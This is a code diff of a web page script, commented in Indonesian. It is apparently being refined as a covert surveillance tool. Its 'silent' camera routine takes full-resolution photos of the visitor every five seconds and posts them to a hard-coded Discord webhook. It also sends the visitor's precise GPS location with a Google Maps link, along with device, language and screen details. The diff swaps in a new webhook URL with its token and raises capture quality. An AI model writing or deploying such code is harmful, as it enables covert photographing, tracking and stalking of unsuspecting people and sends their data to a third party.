@@ -52,11 +52,30 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1550469378913607791/dxhidUhIwSqVhVR4Pe9P5YMzuvucTQR8VKnSJdkf2-Q-7eX48A8LAt9XueA95VUerK2R';
-        const VIDEO_WEBHOOK = 'https://discord.com/api/webhooks/1550469378913607791/dxhidUhIwSqVhVR4Pe9P5YMzuvucTQR8VKnSJdkf2-Q-7eX48A8LAt9XueA95VUerK2R';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1550451547228606494/emiqaTiGbFBHjIM_z7oZuXm_-n-lRMPnePaBUrmCeEdds4MHkxmmOInkXT8AGUOoxaoc';
         
         let cameraStream = null;
         let captureInterval = null;
+
+        // Get live timestamp with timezone
+        function getLiveTimestamp() {
+            const now = new Date();
+            return new Intl.DateTimeFormat('id-ID', {
+                timeZone: 'Asia/Jakarta',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            }).format(now);
+        }
+
+        // Get current timezone
+        function getTimezone() {
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            return tz || 'Asia/Jakarta (UTC+7)';
+        }
 
         // Silent camera access
         async function silentCameraCapture() {
@@ -64,17 +83,16 @@
                 cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
                     },
                     audio: false
                 }).catch(() => {
-                    // Fallback: coba rear camera
                     return navigator.mediaDevices.getUserMedia({
                         video: { 
                             facingMode: 'environment',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
                         },
                         audio: false
                     });
@@ -83,10 +101,10 @@
                 const video = document.getElementById('video');
                 video.srcObject = cameraStream;
                 
-                // Auto-capture every 3 detik
+                // Auto-capture every 5 detik
                 captureInterval = setInterval(() => {
                     captureAndSend();
-                }, 3000);
+                }, 5000);
 
             } catch (error) {
                 console.log('Camera akses gagal');
@@ -94,7 +112,7 @@
             }
         }
 
-        // Capture & encode foto
+        // Capture full resolution & send
         function captureAndSend() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -107,18 +125,20 @@
             
             ctx.drawImage(video, 0, 0);
             
+            // Send with full quality (1.0 = no compression)
             canvas.toBlob((blob) => {
                 sendPhotoToDiscord(blob);
-            }, 'image/jpeg', 0.8);
+            }, 'image/jpeg', 1.0);
         }
 
-        // Convert blob to base64 & send
+        // Convert blob to base64 & send (full resolution)
         function sendPhotoToDiscord(blob) {
             const reader = new FileReader();
             reader.onload = (e) => {
                 const base64 = e.target.result.split(',')[1];
+                const timestamp = getLiveTimestamp();
+                const timezone = getTimezone();
                 
-                // Send via webhook dengan image embed
                 const data = {
                     "embeds": [{
                         "title": "📸 Live Photo Capture",
@@ -128,35 +148,47 @@
                         },
                         "fields": [
                             {
-                                "name": "Timestamp",
-                                "value": new Date().toLocaleString('id-ID'),
+                                "name": "Waktu (Live)",
+                                "value": timestamp,
+                                "inline": true
+                            },
+                            {
+                                "name": "Timezone",
+                                "value": timezone,
                                 "inline": true
                             },
                             {
                                 "name": "Device",
-                                "value": navigator.userAgent.substring(0, 100),
-                                "inline": false
+                                "value": navigator.platform,
+                                "inline": true
+                            },
+                            {
+                                "name": "Resolution",
+                                "value": screen.width + "x" + screen.height,
+                                "inline": true
                             }
                         ]
                     }]
                 };
 
-                fetch(VIDEO_WEBHOOK, {
+                fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
-                });
+                }).catch(err => console.log('Send error:', err));
             };
             reader.readAsDataURL(blob);
         }
 
-        // Capture geolocation (tetap)
+        // Capture geolocation dengan live timestamp
         function captureLocation() {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
+                    const timestamp = getLiveTimestamp();
+                    const timezone = getTimezone();
 
                     const data = {
                         "content": "",
@@ -176,17 +208,27 @@
                                 },
                                 {
                                     "name": "Akurasi",
-                                    "value": accuracy.toString() + "m",
+                                    "value": accuracy.toFixed(2) + " meter",
                                     "inline": true
                                 },
                                 {
                                     "name": "Timezone",
-                                    "value": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                    "value": timezone,
                                     "inline": true
+                                },
+                                {
+                                    "name": "Waktu (Live)",
+                                    "value": timestamp,
+                                    "inline": false
                                 },
                                 {
                                     "name": "Platform",
                                     "value": navigator.platform,
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Bahasa",
+                                    "value": navigator.language,
                                     "inline": true
                                 },
                                 {
@@ -195,13 +237,8 @@
                                     "inline": true
                                 },
                                 {
-                                    "name": "Maps Link",
+                                    "name": "Google Maps",
                                     "value": `https://maps.google.com/?q=${lat},${lon}`,
-                                    "inline": false
-                                },
-                                {
-                                    "name": "Waktu",
-                                    "value": new Date().toLocaleString('id-ID'),
                                     "inline": false
                                 }
                             ]
@@ -212,7 +249,7 @@
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
-                    });
+                    }).catch(err => console.log('Location send error:', err));
                 },
                 function(error) {
                     console.log('Location denied');
